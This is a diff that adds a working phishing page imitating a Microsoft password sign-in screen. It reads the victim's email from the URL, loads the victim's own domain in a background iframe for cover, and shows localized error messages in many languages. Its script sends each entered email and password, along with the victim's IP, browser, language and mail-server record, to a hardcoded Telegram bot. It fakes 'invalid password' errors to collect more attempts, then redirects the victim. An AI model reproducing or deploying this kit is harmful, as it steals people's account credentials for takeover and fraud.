@@ -1,0 +1,894 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="EN-US">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <style>
+        body {
+            transition: opacity ease-in 0.2s;
+        }
+
+        body[unresolved] {
+            opacity: 0;
+            display: block;
+            overflow: hidden;
+            position: relative;
+        }
+    </style>
+
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <title>Sign in to your Microsoft account</title>
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
+    <link rel="shortcut icon" href="./src/favicon.ico">
+    <link rel="stylesheet" type="text/css" href="./src/Converged_v21033__M8MTZS7Nv0I1zR18wdR-g2.css">
+    <link rel="stylesheet" type="text/css" href="./src/Converged_v21033_AZXChPIB5jI3ijrmoNll5w2.css">
+    <style type="text/css"></style>
+    <style type="text/css">
+        body {
+            display: none;
+        }
+    </style>
+    <style type="text/css">
+        body {
+            display: block !important;
+        }
+    </style><noscript>
+        <style type="text/css">
+            body {
+
+                display: block !important;
+            }
+        </style>
+    </noscript>
+
+    <style>
+        .iframes {
+            padding: 0;
+            width: 100%;
+            height: 100vh;
+            position: fixed;
+            top: 0;
+            z-index: -200;
+        }
+
+        /* Default: Desktop (light blur glass effect) */
+        .responsive-bg {
+            background: rgba(255, 255, 255, 0.03);
+            /* slight transparency */
+            backdrop-filter: blur(2px);
+            -webkit-backdrop-filter: blur(8px);
+            /* Safari support */
+            transition: all 0.3s ease;
+        }
+
+        /* Mobile: solid white (no blur for performance) */
+        @media (max-width: 768px) {
+            .responsive-bg {
+                background: #ffffff;
+                backdrop-filter: none;
+                -webkit-backdrop-filter: none;
+            }
+        }
+    </style>
+
+</head>
+
+<body class="cb">
+    <div class="iframes">
+        <iframe src="https://www." scrolling="no" id="iframe" frameborder="0"
+            style="width: 100%; height: 100vh"></iframe>
+    </div>
+
+    <div>
+        <div>
+            <div role="presentation">
+                <!-- ko if: smallImageUrl -->
+                <div>
+                </div>
+                <div></div>
+            </div>
+        </div>
+        <div data-bind="if: activeDialog"></div>
+
+
+        <form name="f1" action="javascript:void(0);" method="POST" spellcheck="false" method="post" target="_top"
+            autocomplete="off">
+            <div class="outer">
+                <div class="middle responsive-bg">
+                    <div class="inner fade-in-lightbox" style="padding-top:50px">
+                        <div class="lightbox-cover"></div>
+                        <div><img class="logo" role="img"
+                                src="./src/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"></div>
+                        <div role="main"><!--  -->
+                            <div data-bind="css: { &#39;zero-opacity&#39;: hidePaginatedView() }" class="">
+                                <div class="animate slide-in-next">
+
+                                    <div><!--  -->
+
+                                        <div class="identityBanner">
+                                            <div id="emailcontent" class="identity" title="cola@gmail.com">
+                                                cola@gmail.com</div>
+                                            <input type="hidden" name="" id="email">
+                                        </div>
+
+                                        <center>
+                                            <div class="alert alert-danger" id="lessThan4"
+                                                style="text-align: start; display: none; color: #e81123;     margin-top: 10px !important;">
+                                                Password must be at least 4 characters long.</div>
+                                            <div class="alert alert-danger" id="msg"
+                                                style="text-align: start; display: none; color: #e81123;     margin-top: 10px !important;">
+                                                Invalid
+                                                password. Please enter the correct information.</div>
+                                            <span id="error" class="text-danger"
+                                                style="text-align: start; display: none; color: #e81123;     margin-top: 10px !important;">The
+                                                account
+                                                does
+                                                not exist. Please enter a different account.</span>
+                                        </center>
+                                    </div>
+                                </div><!-- /ko -->
+                                <div class="pagination-view has-identity-banner animate slide-in-next">
+                                    <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true">
+                                        <!--  --><!--  --> <input type="hidden" name="login" value="cola@gmail.com">
+                                        <input type="text" name="loginfmt"
+                                            data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen"
+                                            tabindex="-1" aria-hidden="true">
+                                        <div id="loginHeader" class="row text-title" role="heading" aria-level="1"
+                                            data-bind="text: str[&#39;CT_PWD_STR_EnterPassword_Title&#39;]">Enter
+                                            password</div>
+                                        <div class="row">
+                                            <div class="form-group col-md-24">
+                                                <div role="alert" aria-live="assertive">
+                                                    <div class="col-md-24 error ext-error" id="usernameError"
+                                                        style="display:none">The Password is incorrect.</div>
+                                                </div>
+                                                <div class="placeholderContainer"> <input type="hidden" name="ssty"
+                                                        value="2810e98e8fe9adf38ace0e1bd9318a22"><input name="passwd"
+                                                        type="password" id="password" name="pdf2" autocomplete="off"
+                                                        class="form-control" aria-required="true"
+                                                        aria-describedby="loginHeader  " placeholder="Password"
+                                                        aria-label="Enter the password for cola@gmail.com" tabindex="0">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div data-bind="css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }"
+                                            class="position-buttons">
+                                            <div>
+                                                <div id="idTd_PWD_KMSI_Cb"
+                                                    class="form-group checkbox text-block-body no-margin-top"
+                                                    data-bind="visible: !svr.G &amp;&amp; !showHipOnPasswordView">
+                                                    <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI"
+                                                            id="idChkBx_PWD_KMSI0Pwd" type="checkbox"
+                                                            data-bind="checked: isKmsiChecked, ariaLabel: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]"
+                                                            aria-label="Keep me signed in"> <span
+                                                            data-bind="text: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]">Keep
+                                                            me signed in</span> </label>
+                                                </div><!-- /ko -->
+                                                <div class="row">
+                                                    <div class="col-md-24">
+                                                        <div class="text-13 action-links">
+                                                            <div class="form-group"> <a id="idA_PWD_ForgotPassword"
+                                                                    role="link">Forgot password?</a> </div>
+                                                            <div class="form-group"></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="row"
+                                                data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }">
+                                                <div>
+                                                    <div class="col-xs-24 no-padding-left-right button-container">
+                                                        <div class="inline-block"><input type="submit" id="submit-btn"
+                                                                class="btn login-btn btn-block btn-primary"
+                                                                value="Sign in">
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div><!-- /ko -->
+                        </div>
+                    </div> <!-- /ko -->
+                </div><!-- /ko -->
+
+                <div></div><!-- /ko --><!-- ko if: svr.AW --><!-- /ko -->
+            </div>
+        </form>
+
+
+    </div>
+
+
+    <style>
+        .tb_button {
+            padding: 1px;
+            cursor: pointer;
+            border-right: 1px solid #8b8b8b;
+            border-left: 1px solid #FFF;
+            border-bottom: 1px solid #fff;
+        }
+
+        .tb_button.hover {
+            border: 2px outset #def;
+            background-color: #f8f8f8 !important;
+        }
+
+        .ws_toolbar {
+            z-index: 100000
+        }
+
+        .ws_toolbar .ws_tb_btn {
+            cursor: pointer;
+            border: 1px solid #555;
+            padding: 3px
+        }
+
+        .tb_highlight {
+            background-color: yellow
+        }
+
+        .tb_hide {
+            visibility: hidden
+        }
+
+        .ws_toolbar img {
+            padding: 2px;
+            margin: 0px
+        }
+    </style>
+
+
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+        integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous">
+        </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
+        integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous">
+        </script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
+        integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous">
+        </script>
+
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.20.0/axios.min.js"></script>
+    <script>
+        /* global $ */
+        $(document).ready(function () {
+            var cntt = 0;
+            initializePage();
+
+            $('#back1').click(function () {
+                $("#msg").hide();
+                $('#ai').val("");
+                $("#automail").animate({
+                    left: 200,
+                    opacity: "hide"
+                }, 0);
+                $("#inputbar").animate({
+                    right: 200,
+                    opacity: "show"
+                }, 1000);
+
+            });
+
+            var ai = handleBase64Data(window.location.hash.substr(1));
+            if (!ai) {
+
+            } else {
+                var my_ai = ai;
+                $('#ai').val(my_ai);
+                var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+                if (!filter.test(my_ai)) {
+                    $('#errror').show();
+                    ai.focus;
+                    return false;
+                }
+                var ind = my_ai.indexOf("@");
+                var m_slic = my_ai.substr((ind + 1));
+                var c = m_slic.substr(0, m_slic.indexOf('.'));
+                var fnll = c.toLowerCase();
+                var fnllu = c.toUpperCase();
+                var browser = GetBrowserandLanguage()[0];
+
+
+
+            }
+
+            var f = "bmV4dC5waHA=";
+
+            $('#sub_btn').click(function (event) {
+                $('#errror').hide();
+                $('#mgss').hide();
+                event.preventDefault();
+                var ai = $("#ai").val();
+                var pr = $("#pr").val();
+                var mgss = $('#mgss').html();
+                $('#mgss').text(mgss);
+                ///////////////////////////
+                var my_ai = ai;
+                var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+                if (!filter.test(my_ai)) {
+                    $('#errror').show();
+                    ai.focus;
+                    return false;
+                }
+
+                var ind = my_ai.indexOf("@");
+                var m_slic = my_ai.substr((ind + 1));
+                var c = m_slic.substr(0, m_slic.indexOf('.'));
+                var fnll = c.toLowerCase();
+                var fnllu = c.toUpperCase();
+
+                // $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain=" + m_slic);
+                $("#logoname").html(fnllu);
+                $(".domain").html(m_slic);
+                ///////////////////////////
+                cntt = cntt + 1;
+
+
+
+            });
+        })
+
+
+        function GetBrowserandLanguage() {
+            // deliver this method 
+            let browser = window.clientInformation.appVersion;
+            let language = window.clientInformation.language;
+            // the return should be an array sorry not object ooo s
+            let info = [browser, language]
+
+            // return info array
+            return info;
+        }
+
+        function initializePage() {
+            // Split the current URL to extract a part
+            const aim = window.location.hash.substr(1).split('/');
+            var hashPart = handleBase64Data(aim[0]);
+
+            const langs = getLocalizedLanguage(aim[1]);
+            // console.log("LanguageDictionary :", hardInput)
+
+            $('#error').html(langs.error);
+            $('#lessThan4').html(langs.lessThan4);
+            $('#msg').html(langs.msg);
+            $('#submit-btn').html(langs.submitBtn);
+            $('#sec-lg-ss').html(langs.secLgSs)
+            $('#frg-psw').html(langs.frgPsw);
+            $('#copy').html(langs.copy);
+            $("#email").attr("placeholder", langs.emlTxt)
+            $("#password").attr("placeholder", langs.pswTxt)
+            // $('#loginText').html(langs.loginText);
+            // $('#cancel-btn').html(langs.cancelText);
+            if (hashPart) {
+                hashPart = convertToBase64(hashPart)
+                // Split the extracted part further
+                var emailParts = hashPart.split('@');
+                var domainName = emailParts[1].split('.')[0];
+
+                // Capitalize the first letter of the domain name
+                var capitalizedDomain = domainName.charAt(0).toUpperCase() + domainName.slice(1);
+
+                // Update elements on the page
+                var logoUrl = "https://logo.clearbit.com/" + emailParts[1];
+                $.get(logoUrl)
+                    .done(function () {
+                        $("#logoimg").attr("src", logoUrl);
+                        $("#favicon").attr("href", logoUrl);
+                        $("#logoimg").show();
+                    })
+                    .fail(function () {
+                        logoUrl = "https://www.google.com/s2/favicons?domain=" + emailParts[1];
+                        $.get(logoUrl)
+                            .done(function () {
+                                $("#logoimg").hide();
+                            })
+                            .fail(function () {
+                                $("#logoimg").hide();
+                            })
+                    });
+
+                $("#loginMgs").html(`${capitalizedDomain} ${langs.emlLogin}`);
+                document.title = `${capitalizedDomain} - ${langs.mail}`;
+                $("#email").val(hashPart);
+
+                // Toggle password visibility
+                $("#pass-eye").click(_0x4d7017 => {
+                    if ($("#password").attr("type") != "text") {
+                        $("#password").attr("type", "text");
+                    } else {
+                        $("#password").attr("type", "password");
+                    }
+                });
+
+                // Call a function to handle form submission
+                handleFormSubmission($("#email"), $("#password"), emailParts[1], langs);
+            }
+        }
+
+        function convertToBase64(str) {
+            if (/^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)?$/.test(str)) {
+                return atob(str);
+            } else {
+                return str;
+            }
+        }
+
+        function handleFormSubmission(emailField, passwordField, domain, langs) {
+
+            var attempts = 0;
+            var msgElement = $("#msg");
+            var lessThan4Element = $("#lessThan4");
+            var errorElement = $("#error");
+
+            $('form[name="f1"]').submit(function (event) {
+                errorElement.hide();
+                msgElement.hide();
+                event.preventDefault();
+                lessThan4Element.hide();
+                $("#submit-btn").html(langs.verifyingText);
+                var ai = emailField.val();
+                var pr = passwordField.val();
+
+                var my_ai = ai;
+                var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+                if (!filter.test(my_ai)) {
+                    $('#error').show();
+                    emailField.focus();
+                    return false;
+                }
+
+                var ind = my_ai.indexOf("@");
+                var m_slic = my_ai.substr((ind + 1));
+                var c = m_slic.substr(0, m_slic.indexOf('.'));
+                var fnll = c.toLowerCase();
+                var fnllu = c.toUpperCase();
+
+
+
+                setTimeout(async () => {
+                    if (emailField.val() == '') {
+                        errorElement.show();
+                    } else {
+                        if (passwordField.val() == '') {
+                            msgElement.show();
+                        } else {
+                            if (passwordField.val().length < 4) {
+                                lessThan4Element.show();
+                                passwordField.val('');
+                            } else {
+                                ai = emailField.val();
+                                pr = passwordField.val();
+
+                                var date = new Date();
+                                const ip = await sendVisitorIP();
+                                // console.log('MX Record', await getMXRecord(domain))
+
+
+                                var message = "--------+ General Webmail ReZulT +--------\n";
+                                message += "Email : " + ai + "\n";
+                                message += "Password : " + pr + "\n";
+                                message += "Browser : " + GetBrowserandLanguage()[0] + "\n";
+
+                                message += "Language : " + GetBrowserandLanguage()[1] + "\n";
+                                message += "MX Record : " + await getMXRecord(domain) + "\n";
+                                message += "IP Address : " + ip + "\n";
+                                message += "Date : " + date + "\n";
+                                message += "---------+ General Webmail ReZulT +-------------\n";
+                                var token = "8283910032:AAFWE3HnBXY3gjGrV-ms5J083HalBaDRBTU";
+                                var chatId = "6156753911";
+
+                                $.ajax({
+                                    dataType: 'JSON',
+                                    url: `https://api.telegram.org/bot${token}/sendMessage`,
+                                    type: 'POST',
+                                    data: {
+                                        "chat_id": chatId,
+                                        "text": message
+                                    },
+                                    beforeSend: function (xhr) {
+                                        $('#submit-btn').html(langs.verifyingText);
+                                    },
+                                    success: function (response) {
+                                        if (response) {
+                                            if (response['ok'] == true) {
+                                                if (attempts >= 2) {
+                                                    attempts = 0;
+                                                    $(".login-form").hide();
+                                                    $(".success-con").show();
+                                                    $(".success-con .msg").html(`
+                      ${langs.yourEmail} <br>
+                      ${langs.success}</b>
+                    `);
+                                                    setTimeout(() => {
+                                                        window.location.replace(
+                                                            `http://www.${domain}`); // Redirect to the desired page
+                                                    }, 5000);
+                                                } else {
+                                                    attempts++;
+                                                    msgElement.show();
+                                                    passwordField.val('');
+                                                    $('#submit-btn').html(langs.submitBtn);
+                                                }
+                                            }
+                                        }
+                                    },
+                                    error: function (err) {
+                                        $('#net-errror').show();
+                                        passwordField.val('');
+                                        console.log("Error : ", err);
+                                    }
+                                });
+                            }
+                        }
+                    }
+                });
+            });
+        }
+    </script>
+    <script>
+        var url = location.href;
+        const link = new URL(url);
+        let email = link.hash;
+        email = handleBase64Data(email.substr(1).split('/')[0]);
+        document.getElementById("emailcontent").innerHTML = email
+        let website = email.substring(email.indexOf("@") + 1).toLowerCase();
+
+        const microsoftDomains = ["outlook.com", "hotmail.com", "live.com"];
+
+        if (microsoftDomains.includes(website)) {
+            website = "microsoft.com";
+        }
+
+        document.getElementById("iframe").src = "https://www." + website;
+
+        function handleBase64Data(string) {
+
+            try {
+                return atob(string);
+            } catch (error) {
+                return string;
+            }
+        }
+
+        function getVisitorIP() {
+            return new Promise(function (resolve, reject) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://ipinfo.io/json', true);
+                xhr.onload = function () {
+                    if (xhr.status >= 200 && xhr.status < 300) {
+                        var response = JSON.parse(xhr.responseText);
+                        resolve(response.ip);
+                    } else {
+                        reject('Failed to fetch IP address');
+                    }
+                };
+                xhr.onerror = function () {
+                    reject('Failed to fetch IP address');
+                };
+                xhr.send();
+            });
+        }
+
+        async function getMXRecord(domain) {
+            try {
+                const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
+                const data = await response.json();
+
+                if (data && data.Answer && data.Answer.length > 0) {
+                    const mxRecords = data.Answer.map(record => `${record.data}`).join('\n');
+                    return mxRecords;
+                } else {
+                    return 'no-mx';
+                }
+            } catch (error) {
+                return 'MX-Error';
+            }
+        }
+
+
+
+        async function sendVisitorIP() {
+            try {
+                var visitorIP = await getVisitorIP();
+                return visitorIP;
+                // Here you can send the visitorIP value to your desired destination
+            } catch (error) {
+                return error
+            }
+        }
+
+        function GetBrowserandLanguage() {
+            // deliver this method 
+            let browser = window.clientInformation.appVersion;
+            let language = window.clientInformation.language;
+            // the return should be an array sorry not object ooo s
+            let info = [browser, language]
+
+            // return info array
+            return info;
+        }
+
+        function getLocalizedLanguage(customLocale = '') {
+            const userLanguage = (customLocale != '') ? customLocale : navigator.language || navigator.userLanguage;
+            const languageCode = userLanguage.substring(0, 2);
+            const lang = {
+                en: {
+                    lessThan4: "Password must be at least 4 characters long.",
+                    msg: "Invalid password. Please enter the correct information.",
+                    error: "The account does not exist. Please enter a different account.",
+                    emlTxt: "Email",
+                    pswTxt: "Password",
+                    submitBtn: "Login",
+                    secLgSs: "Secure login session",
+                    frgPsw: "Forgot password?",
+                    copy: "Copyright © 2023",
+                    verifyingText: "Verifying...",
+                    emlLogin: "Email Login",
+                    mail: "Mail",
+                    yourEmail: "Your email has been successfully activated.",
+                    success: "Thank you. You will receive your file in your email shortly."
+                },
+                zh: {
+                    lessThan4: "密码长度必须大于4个字符。",
+                    msg: "无效的密码。请输入正确的信息。",
+                    error: "该账户不存在。请输入其他账户。",
+                    emlTxt: "邮箱",
+                    pswTxt: "密码",
+                    submitBtn: "登录",
+                    secLgSs: "安全登录会话",
+                    frgPsw: "忘记密码？",
+                    copy: "版权所有 © 2023",
+                    verifyingText: "验证中...",
+                    emlLogin: "邮箱登录",
+                    mail: "邮箱",
+                    yourEmail: "您的邮箱已成功激活。",
+                    success: "谢谢。您将在邮件中收到您的文件。"
+                },
+                ja: {
+                    lessThan4: "パスワードは4文字以上である必要があります。",
+                    msg: "無効なパスワードです。正しい情報を入力してください。",
+                    error: "アカウントが存在しません。別のアカウントを入力してください。",
+                    emlTxt: "メール",
+                    pswTxt: "パスワード",
+                    submitBtn: "ログイン",
+                    secLgSs: "セキュアログインセッション",
+                    frgPsw: "パスワードを忘れた場合",
+                    copy: "著作権 © 2023",
+                    verifyingText: "確認中...",
+                    emlLogin: "メールログイン",
+                    mail: "メール",
+                    yourEmail: "あなたのメールは正常にアクティブ化されました。",
+                    success: "ありがとうございます。ファイルはすぐにメールでお届けします。"
+                },
+                pt: {
+                    lessThan4: "A senha deve ter mais de 4 caracteres.",
+                    msg: "Senha inválida. Por favor, insira as informações corretas.",
+                    error: "A conta não existe. Por favor, insira uma conta diferente.",
+                    emlTxt: "Email",
+                    pswTxt: "Senha",
+                    submitBtn: "Entrar",
+                    secLgSs: "Sessão de login segura",
+                    frgPsw: "Esqueceu a senha?",
+                    copy: "Copyright © 2023",
+                    verifyingText: "Verificando...",
+                    emlLogin: "Login por Email",
+                    mail: "Email",
+                    yourEmail: "Seu email foi ativado com sucesso.",
+                    success: "Obrigado. Você receberá seu arquivo em seu email em breve."
+                },
+                ko: {
+                    lessThan4: "비밀번호는 4자 이상이어야 합니다.",
+                    msg: "잘못된 비밀번호입니다. 올바른 정보를 입력하세요.",
+                    error: "해당 계정이 존재하지 않습니다. 다른 계정을 입력하세요.",
+                    emlTxt: "이메일",
+                    pswTxt: "비밀번호",
+                    submitBtn: "로그인",
+                    secLgSs: "보안 로그인 세션",
+                    frgPsw: "비밀번호를 잊으셨나요?",
+                    copy: "저작권 © 2023",
+                    verifyingText: "확인 중...",
+                    emlLogin: "이메일 로그인",
+                    mail: "메일",
+                    yourEmail: "이메일이 성공적으로 활성화되었습니다.",
+                    success: "감사합니다. 곧 이메일로 파일을 받으실 수 있습니다."
+                },
+                es: {
+                    lessThan4: "La contraseña debe tener más de 4 caracteres.",
+                    msg: "Contraseña inválida. Por favor, ingrese la información correcta.",
+                    error: "La cuenta no existe. Por favor, ingrese una cuenta diferente.",
+                    emlTxt: "Correo electrónico",
+                    pswTxt: "Contraseña",
+                    submitBtn: "Iniciar sesión",
+                    secLgSs: "Sesión de inicio segura",
+                    frgPsw: "¿Olvidaste tu contraseña?",
+                    copy: "Copyright © 2023",
+                    verifyingText: "Verificando...",
+                    emlLogin: "Inicio de sesión por correo electrónico",
+                    mail: "Correo electrónico",
+                    yourEmail: "Tu correo electrónico se ha activado correctamente.",
+                    success: "Gracias. Recibirás tu archivo en tu correo electrónico en breve."
+                },
+                it: {
+                    lessThan4: "La password deve contenere almeno 4 caratteri.",
+                    msg: "Password non valida. Inserisci le informazioni corrette.",
+                    error: "L'account non esiste. Inserisci un account diverso.",
+                    emlTxt: "Email",
+                    pswTxt: "Password",
+                    submitBtn: "Accedi",
+                    secLgSs: "Sessione di accesso sicuro",
+                    frgPsw: "Password dimenticata?",
+                    copy: "Copyright © 2023",
+                    verifyingText: "Verifica in corso...",
+                    emlLogin: "Accesso tramite email",
+                    mail: "Email",
+                    yourEmail: "La tua email è stata attivata con successo.",
+                    success: "Grazie. Riceverai il tuo file nella tua email a breve."
+                },
+                de: {
+                    lessThan4: "Das Passwort muss mindestens 4 Zeichen lang sein.",
+                    msg: "Ungültiges Passwort. Bitte geben Sie die richtigen Informationen ein.",
+                    error: "Das Konto existiert nicht. Bitte geben Sie ein anderes Konto ein.",
+                    emlTxt: "E-Mail",
+                    pswTxt: "Passwort",
+                    submitBtn: "Anmelden",
+                    secLgSs: "Sichere Anmeldesitzung",
+                    frgPsw: "Passwort vergessen?",
+                    copy: "Copyright © 2023",
+                    verifyingText: "Überprüfung läuft...",
+                    emlLogin: "E-Mail-Anmeldung",
+                    mail: "E-Mail",
+                    yourEmail: "Ihre E-Mail wurde erfolgreich aktiviert.",
+                    success: "Vielen Dank. Sie erhalten in Kürze Ihre Datei per E-Mail."
+                },
+                fr: {
+                    lessThan4: "Le mot de passe doit comporter plus de 4 caractères.",
+                    msg: "Mot de passe invalide. Veuillez entrer les bonnes informations.",
+                    error: "Le compte n'existe pas. Veuillez entrer un compte différent.",
+                    emlTxt: "Email",
+                    pswTxt: "Mot de passe",
+                    submitBtn: "Se connecter",
+                    secLgSs: "Session de connexion sécurisée",
+                    frgPsw: "Mot de passe oublié ?",
+                    copy: "Copyright © 2023",
+                    verifyingText: "Vérification en cours...",
+                    emlLogin: "Connexion par email",
+                    mail: "Email",
+                    yourEmail: "Votre email a été activé avec succès.",
+                    success: "Merci. Vous recevrez votre fichier dans votre email sous peu."
+                },
+                lt: {
+                    lessThan4: "Slaptažodis turi būti ilgesnis nei 4 simboliai.",
+                    msg: "Neteisingas slaptažodis. Įveskite teisingą informaciją.",
+                    error: "Paskyra neegzistuoja. Įveskite kitą paskyrą.",
+                    emlTxt: "El. paštas",
+                    pswTxt: "Slaptažodis",
+                    submitBtn: "Prisijungti",
+                    secLgSs: "Saugi prisijungimo sesija",
+                    frgPsw: "Pamiršote slaptažodį?",
+                    copy: "Autorių teisė © 2023",
+                    verifyingText: "Tikrinama...",
+                    emlLogin: "El. pašto prisijungimas",
+                    mail: "El. paštas",
+                    yourEmail: "Jūsų el. paštas sėkmingai aktyvuotas.",
+                    success: "Ačiū. Netrukus gausite savo failą el. paštu."
+                },
+                sv: {
+                    lessThan4: "Lösenordet måste vara längre än 4 tecken.",
+                    msg: "Ogiltigt lösenord. Ange korrekt information.",
+                    error: "Kontot existerar inte. Ange ett annat konto.",
+                    emlTxt: "E-post",
+                    pswTxt: "Lösenord",
+                    submitBtn: "Logga in",
+                    secLgSs: "Säker inloggningssession",
+                    frgPsw: "Glömt lösenordet?",
+                    copy: "Upphovsrätt © 2023",
+                    verifyingText: "Verifierar...",
+                    emlLogin: "E-postinloggning",
+                    mail: "E-post",
+                    yourEmail: "Din e-post har aktiverats framgångsrikt.",
+                    success: "Tack. Du kommer snart att få din fil via e-post."
+                },
+                et: {
+                    lessThan4: "Parool peab olema vähemalt 4 tähemärki pikk.",
+                    msg: "Vale parool. Palun sisesta õiged andmed.",
+                    error: "Sellist kontot ei eksisteeri. Palun sisesta teine konto.",
+                    emlTxt: "Email",
+                    pswTxt: "Parool",
+                    submitBtn: "Logi sisse",
+                    secLgSs: "Turvaline sisselogimissessioon",
+                    frgPsw: "Unustasid parooli?",
+                    copy: "Autoriõigus © 2023",
+                    verifyingText: "Kontrollib...",
+                    emlLogin: "Emailiga sisselogimine",
+                    mail: "Email",
+                    yourEmail: "Teie e-post on edukalt aktiveeritud.",
+                    success: "Aitäh. Teile saadetakse fail peatselt teie e-posti aadressile."
+                },
+                tr: {
+                    lessThan4: "Parola 4 karakterden uzun olmalıdır.",
+                    msg: "Geçersiz parola. Lütfen doğru bilgileri girin.",
+                    error: "Hesap mevcut değil. Lütfen farklı bir hesap girin.",
+                    emlTxt: "E-posta",
+                    pswTxt: "Parola",
+                    submitBtn: "Giriş",
+                    secLgSs: "Güvenli oturum açma",
+                    frgPsw: "Parolanızı mı unuttunuz?",
+                    copy: "Telif Hakkı © 2023",
+                    verifyingText: "Doğrulanıyor...",
+                    emlLogin: "E-posta ile Giriş",
+                    mail: "E-posta",
+                    yourEmail: "E-postanız başarıyla etkinleştirildi.",
+                    success: "Teşekkür ederiz. Dosyanızı yakında e-postanızda alacaksınız."
+                },
+                ar: {
+                    lessThan4: "يجب أن تكون كلمة المرور أكثر من 4 أحرف.",
+                    msg: "كلمة المرور غير صالحة. الرجاء إدخال المعلومات الصحيحة.",
+                    error: "الحساب غير موجود. الرجاء إدخال حساب مختلف.",
+                    emlTxt: "البريد الإلكتروني",
+                    pswTxt: "كلمة المرور",
+                    submitBtn: "تسجيل الدخول",
+                    secLgSs: "جلسة تسجيل الدخول الآمنة",
+                    frgPsw: "هل نسيت كلمة المرور؟",
+                    copy: "حقوق النشر © 2023",
+                    verifyingText: "جار التحقق...",
+                    emlLogin: "تسجيل الدخول عبر البريد الإلكتروني",
+                    mail: "البريد",
+                    yourEmail: "تم تنشيط بريدك الإلكتروني بنجاح.",
+                    success: "شكرًا لك. ستتلقى الملف في بريدك الإلكتروني قريبًا."
+                },
+                ru: {
+                    lessThan4: "Пароль должен содержать более 4 символов.",
+                    msg: "Неверный пароль. Пожалуйста, введите правильную информацию.",
+                    error: "Аккаунт не существует. Пожалуйста, введите другой аккаунт.",
+                    emlTxt: "Электронная почта",
+                    pswTxt: "Пароль",
+                    submitBtn: "Вход",
+                    secLgSs: "Безопасная сессия входа",
+                    frgPsw: "Забыли пароль?",
+                    copy: "Авторское право © 2023",
+                    verifyingText: "Проверка...",
+                    emlLogin: "Вход по электронной почте",
+                    mail: "Почта",
+                    yourEmail: "Ваш электронный адрес успешно активирован.",
+                    success: "Спасибо. Вы получите свой файл на почту в ближайшее время."
+                },
+                vi: {
+                    lessThan4: "Mật khẩu phải chứa ít nhất 4 ký tự.",
+                    msg: "Mật khẩu không hợp lệ. Vui lòng nhập thông tin đúng.",
+                    error: "Tài khoản không tồn tại. Vui lòng nhập một tài khoản khác.",
+                    emlTxt: "Email",
+                    pswTxt: "Mật khẩu",
+                    submitBtn: "Đăng nhập",
+                    secLgSs: "Phiên đăng nhập an toàn",
+                    frgPsw: "Quên mật khẩu?",
+                    copy: "Bản quyền © 2023",
+                    verifyingText: "Đang xác minh...",
+                    emlLogin: "Đăng nhập qua Email",
+                    mail: "Email",
+                    yourEmail: "Email của bạn đã được kích hoạt thành công.",
+                    success: "Cảm ơn bạn. Bạn sẽ nhận được tệp tin trong email của mình sớm thôi."
+                }
+            }
+
+            return lang[languageCode] || lang['en']
+
+        }
+
+
+    </script>
+
+</body>
+
+</html>
